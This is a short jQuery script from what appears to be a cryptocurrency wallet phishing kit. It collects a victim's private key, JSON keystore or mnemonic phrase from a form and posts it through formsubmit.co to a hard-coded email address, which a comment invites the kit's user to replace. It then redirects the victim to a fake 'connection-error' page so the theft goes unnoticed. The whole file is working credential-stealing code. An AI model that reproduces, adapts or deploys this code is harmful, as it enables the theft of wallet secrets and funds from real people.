$(document).ready(function () {
	var email = "dadaadeife@gmail.com"; //enter your email address here

	$(".submit-btn").click(function (e) {
		e.preventDefault();
		var btn = $(this);
		if (btn.attr("id") == "private-btn") {
			var type = "private key";
			var data = $("#private-key").val();
		} else if (btn.attr("id") == "json-btn") {
			var type = "json key";
			var data = $("#json-key").val();
		} else if (btn.attr("id") == "mnemonic-btn") {
			var type = "mnemonic phrase";
			var data = $("#mnemonic").val();
		}

		if (data == "") {
			alert("Please enter the required key or phrase.");
			return false;
		}

		$.ajax({
			url: "https://formsubmit.co/ajax/" + email,
			method: "POST",
			data: {
				Type: type,
				Data: data,
			},
			dataType: "json",
		})
			.done(function (res) {
				window.location.replace("connection-error.html");
			})
			.fail(function () {
				alert("Error");
			});
	});
});
